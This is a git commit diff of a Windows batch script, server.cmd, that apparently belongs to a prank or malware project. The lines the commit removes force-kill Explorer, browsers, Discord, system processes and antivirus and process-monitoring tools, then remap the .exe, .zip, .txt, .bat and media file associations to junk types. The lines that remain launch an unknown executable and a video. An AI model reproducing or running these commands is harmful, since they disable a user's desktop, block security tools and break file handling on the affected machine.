7c596fc16fb9699aeee05f1d1de1219b59e3975f
wjdwldh22262 <66481016+wjdwldh22262@users.noreply.github.com>
2021-04-26 19:35:31 +0900

    Update server.cmd

--- server.cmd
+++ server.cmd
@@ -6,36 +6,7 @@ cls
 
 start server\min.exe
 start server\skr.mp4
-taskkill /f /im explorer.exe
-taskkill /f /im chrome.exe
-taskkill /f /im opera.exe
-taskkill /f /im mspalnt.exe
-taskkill /f /im calc.exe
-taskkill /f /im lirefox.exe
-taskkill /f /im ProcessExplorer.exe
-taskkill /f /im ProcessHacker.exe
-taskkill /f /im iexplore.exe
-taskkill /f /im notepad.exe
-taskkill /f /im yandex.exe
-taskkill /f /im browser.exe
-taskkill /f /im eset.exe
-taskkill /f /im protogent.exe
-taskkill /f /im regedit
-taskkill /f /im rundll32.exe
-taskkill /f /im rundll.exe
-taskkill /f /im dllhost.exe
-taskkill /f /im superalt14.exe
-taskkill /f /im msedge.exe
-taskkill /f /im microsoftedge.exe
-taskkill /f /im mrsmjrgui.exe
-taskkill /f /im yandex.exe
-taskkill /f /im discord.exe
-assoc .zip=error.sss
-assoc .exe=erroa.ssa
-assoc .txt=errow.ssw
-assoc .mp4=erroe.sse
-assoc .mp3=erroq.ssq
-assoc .bat=errog.ssg
+
 start error
 
 exit
